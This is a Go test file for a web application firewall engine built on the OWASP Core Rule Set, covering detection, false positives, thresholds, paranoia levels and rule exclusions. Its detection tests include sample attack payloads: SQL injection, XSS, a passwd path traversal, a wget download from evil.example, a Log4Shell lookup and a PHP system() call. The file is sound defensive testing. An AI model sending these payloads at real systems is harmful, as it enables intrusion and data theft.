package crs

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

var (
	defaultOnce   sync.Once
	defaultEngine *Engine
	defaultErr    error
)

// engine returns an engine with the default settings, loaded once.
func engine(t testing.TB) *Engine {
	t.Helper()
	defaultOnce.Do(func() { defaultEngine, defaultErr = New(Config{}) })
	if defaultErr != nil {
		t.Fatal(defaultErr)
	}
	return defaultEngine
}

// browser returns a request with the headers a browser sends, so that
// protocol rules do not interfere.
func browser(method, target, contentType, body string) (*http.Request, []byte) {
	r := httptest.NewRequest(method, target, strings.NewReader(body))
	r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0")
	r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	r.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if contentType != "" {
		r.Header.Set("Content-Type", contentType)
	}
	if body == "" {
		return r, nil
	}
	return r, []byte(body)
}

func inspect(t *testing.T, e *Engine, r *http.Request, body []byte) *Result {
	t.Helper()
	res, err := e.Inspect(r, body, "192.0.2.10", "test")
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func TestDetectsAttacks(t *testing.T) {
	tests := []struct {
		name, method, target, contentType, body string
		wantCategory                            string
	}{
		{"sqli", "GET", "/search?q=1%27%20OR%20%271%27=%271", "", "", "sqli"},
		{"union select", "GET", "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", "", "", "sqli"},
		{"xss", "GET", "/?q=%3Cscript%3Ealert(1)%3C/script%3E", "", "", "xss"},
		{"path traversal", "GET", "/download?file=../../../../etc/passwd", "", "", "lfi"},
		{"command injection", "GET", "/ping?host=127.0.0.1;wget%20http://evil.example/x.sh", "", "", "rce"},
		{"log4shell", "GET", "/?x=${jndi:ldap://evil.example/a}", "", "", "rce"},
		{"sqli in form body", "POST", "/login", "application/x-www-form-urlencoded", "user=admin%27--&pw=x", "sqli"},
		{"xss in json body", "POST", "/api", "application/json", `{"comment":"<img src=x onerror=alert(1)>"}`, "xss"},
		{"php injection in xml body", "POST", "/api", "application/xml", `<a>&lt;?php system($_GET['c']); ?&gt;</a>`, "injection-php"},
	}
	e := engine(t)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			r, body := browser(tc.method, tc.target, tc.contentType, tc.body)
			res := inspect(t, e, r, body)
			if res == nil {
				t.Fatal("not detected")
			}
			if res.RuleID != 949110 || res.Status != http.StatusForbidden || res.AnomalyScore < DefaultInboundThreshold {
				t.Errorf("rule %d, status %d, score %d; want 949110, 403, >= 5", res.RuleID, res.Status, res.AnomalyScore)
			}
			a := res.Attack()
			if a == nil || !hasTag(a.Tags, "attack-"+tc.wantCategory) {
				t.Errorf("attack = %+v, want category %s", a, tc.wantCategory)
			}
		})
	}
}

func hasTag(tags []string, tag string) bool {
	for _, t := range tags {
		if t == tag {
			return true
		}
	}
	return false
}

func TestAllowsCleanRequests(t *testing.T) {
	tests := []struct{ name, method, target, contentType, body string }{
		{"page", "GET", "/products?category=books&sort=price&page=2", "", ""},
		{"search with apostrophe", "GET", "/search?q=O%27Brien%27s+pub", "", ""},
		{"form", "POST", "/contact", "application/x-www-form-urlencoded", "name=Alice&message=Hello%2C+I+would+like+a+quote."},
		{"json api", "POST", "/api/orders", "application/json", `{"item":"book","qty":2,"note":"gift wrap, please"}`},
		{"xml api", "POST", "/api/orders", "application/xml", `<order><item>book</item><qty>2</qty></order>`},
	}
	e := engine(t)
	for _, tc := range tests {
		r, body := browser(tc.method, tc.target, tc.contentType, tc.body)
		if res := inspect(t, e, r, body); res != nil {
			t.Errorf("%s: false positive: %+v", tc.name, res.Matches)
		}
	}
}

func TestMatchDetails(t *testing.T) {
	r, body := browser("POST", "/api", "application/json", `{"user":{"name":"1' OR '1'='1"}}`)
	res := inspect(t, engine(t), r, body)
	if res == nil {
		t.Fatal("not detected")
	}
	a := res.Attack()
	if a == nil || a.ID != 942100 || a.Severity != "critical" || a.Variable != "ARGS:json.user.name" || a.Value != "1' OR '1'='1" {
		t.Errorf("attack = %+v", a)
	}
	// The deciding rule is included, informational rules are not.
	var ids []int
	for _, m := range res.Matches {
		ids = append(ids, m.ID)
		if m.Severity == "" && m.ID != res.RuleID {
			t.Errorf("rule %d without severity in matches", m.ID)
		}
	}
	if ids[len(ids)-1] != 949110 {
		t.Errorf("matches = %v, want 949110 last", ids)
	}
}

// Coraza ignores arguments beyond SecArgumentsLimit, so requests with more
// arguments than allowed must be rejected rather than partly inspected.
func TestTooManyArguments(t *testing.T) {
	e, err := New(Config{MaxArgs: 50, InboundThreshold: 1000})
	if err != nil {
		t.Fatal(err)
	}
	form := func(n int) string {
		var b strings.Builder
		for i := range n {
			fmt.Fprintf(&b, "f%d=x&", i)
		}
		return b.String()
	}
	// The limit itself is allowed.
	r, b := browser("POST", "/api", "application/x-www-form-urlencoded", form(50))
	if res := inspect(t, e, r, b); res != nil {
		t.Errorf("50 arguments rejected: %+v", res.Matches)
	}
	for name, req := range map[string]func() (*http.Request, []byte){
		"form": func() (*http.Request, []byte) {
			return browser("POST", "/api", "application/x-www-form-urlencoded", form(50)+"q=1%27+OR+%271%27%3D%271")
		},
		"json": func() (*http.Request, []byte) {
			return browser("POST", "/api", "application/json", "["+strings.Repeat("1,", 50)+`"1' OR '1'='1"]`)
		},
		"query": func() (*http.Request, []byte) {
			return browser("GET", "/?"+form(50)+"q=1%27+OR+%271%27%3D%271", "", "")
		},
		"query and body": func() (*http.Request, []byte) {
			return browser("POST", "/?"+form(30), "application/x-www-form-urlencoded", form(21))
		},
	} {
		r, b := req()
		res := inspect(t, e, r, b)
		// Rejected regardless of the (high) anomaly threshold.
		if res == nil || res.RuleID != TooManyArgsRuleID || res.Status != http.StatusBadRequest {
			t.Errorf("%s: result = %+v, want rule %d with status 400", name, res, TooManyArgsRuleID)
		} else if a := res.Attack(); a == nil || a.ID != TooManyArgsRuleID {
			t.Errorf("%s: attack = %+v, want the deciding rule", name, a)
		}
	}
}

func TestUnparsableBodyIsRejected(t *testing.T) {
	r, body := browser("POST", "/api", "application/json", `{"user":`)
	res := inspect(t, engine(t), r, body)
	if res == nil || res.RuleID != 200002 || res.Status != http.StatusBadRequest {
		t.Fatalf("result = %+v, want rule 200002 with status 400", res)
	}
	if a := res.Attack(); a == nil || a.ID != 200002 {
		t.Errorf("attack = %+v, want the deciding rule", a)
	}
}

func TestAnomalyThreshold(t *testing.T) {
	// One critical rule (942100, 5 points) matches this request.
	r, _ := browser("GET", "/search?q=1%27%20OR%20%271%27=%271", "", "")
	e, err := New(Config{InboundThreshold: 100})
	if err != nil {
		t.Fatal(err)
	}
	if res := inspect(t, e, r, nil); res != nil {
		t.Errorf("score %d blocked with threshold 100", res.AnomalyScore)
	}
}

func TestParanoiaLevel(t *testing.T) {
	// Rule 942430 (restricted SQL character anomaly) is at paranoia level 2.
	target := "/?q=" + strings.Repeat("%27%28", 12)
	r, _ := browser("GET", target, "", "")
	if res := inspect(t, engine(t), r, nil); res != nil {
		t.Fatalf("detected at paranoia level 1: %+v", res.Matches)
	}
	e, err := New(Config{ParanoiaLevel: 2})
	if err != nil {
		t.Fatal(err)
	}
	r, _ = browser("GET", target, "", "")
	if res := inspect(t, e, r, nil); res == nil {
		t.Error("not detected at paranoia level 2")
	}
}

func writeRules(t *testing.T, rules string) string {
	t.Helper()
	f := filepath.Join(t.TempDir(), "rules.conf")
	if err := os.WriteFile(f, []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}
	return f
}

func TestRuleExclusions(t *testing.T) {
	sqli := "/search?q=1%27%20OR%20%271%27=%271"

	after := writeRules(t, "SecRuleRemoveById 942100\n")
	e, err := New(Config{RulesAfter: []string{after}})
	if err != nil {
		t.Fatal(err)
	}
	r, _ := browser("GET", sqli, "", "")
	if res := inspect(t, e, r, nil); res != nil {
		t.Errorf("rule removed after CRS still matched: %+v", res.Matches)
	}

	// Remove the rule only for one path, at runtime.
	before := writeRules(t, `SecRule REQUEST_FILENAME "@beginsWith /search" "id:1000,phase:1,pass,nolog,ctl:ruleRemoveById=942100"`+"\n")
	e, err = New(Config{RulesBefore: []string{filepath.Join(filepath.Dir(before), "*.conf")}})
	if err != nil {
		t.Fatal(err)
	}
	r, _ = browser("GET", sqli, "", "")
	if res := inspect(t, e, r, nil); res != nil {
		t.Errorf("rule removed for /search still matched: %+v", res.Matches)
	}
	r, _ = browser("GET", strings.Replace(sqli, "/search", "/other", 1), "", "")
	if res := inspect(t, e, r, nil); res == nil {
		t.Error("rule removed for other paths too")
	}

	// Exclude one argument from a class of rules, as in the README.
	after = writeRules(t, `SecRuleUpdateTargetByTag "attack-sqli" "!ARGS:password"`+"\n")
	e, err = New(Config{RulesAfter: []string{after}})
	if err != nil {
		t.Fatal(err)
	}
	r, b := browser("POST", "/login", "application/x-www-form-urlencoded", "user=alice&password=1%27+OR+%271%27%3D%271")
	if res := inspect(t, e, r, b); res != nil {
		t.Errorf("excluded argument still inspected: %+v", res.Matches)
	}
	r, b = browser("POST", "/login", "application/x-www-form-urlencoded", "user=1%27+OR+%271%27%3D%271&password=x")
	if res := inspect(t, e, r, b); res == nil {
		t.Error("other arguments no longer inspected")
	}
}

func TestNewValidates(t *testing.T) {
	for name, cfg := range map[string]Config{
		"paranoia level 0 after default": {ParanoiaLevel: 5},
		"negative paranoia level":        {ParanoiaLevel: -1},
		"negative threshold":             {InboundThreshold: -5},
		"negative argument limit":        {MaxArgs: -1},
		"missing file":                   {RulesAfter: []string{"/nonexistent/*.conf"}},
		"include":                        {RulesAfter: []string{writeRules(t, "Include other.conf\n")}},
		"invalid directive":              {RulesAfter: []string{writeRules(t, "SecNoSuchDirective On\n")}},
	} {
		if _, err := New(cfg); err == nil {
			t.Errorf("%s: New succeeded", name)
		}
	}
}

func BenchmarkInspect(b *testing.B) {
	e := engine(b)
	for _, bc := range []struct{ name, method, target, contentType, body string }{
		{"typical GET", "GET", "/products?category=books&sort=price&page=2", "", ""},
		{"JSON POST", "POST", "/api/orders", "application/json", `{"items":[` + strings.Repeat(`{"id":12345,"name":"O'Brien's item","desc":"plain text description"},`, 100) + `{}]}`},
	} {
		b.Run(bc.name, func(b *testing.B) {
			for b.Loop() {
				r, body := browser(bc.method, bc.target, bc.contentType, bc.body)
				if _, err := e.Inspect(r, body, "192.0.2.10", "bench"); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}
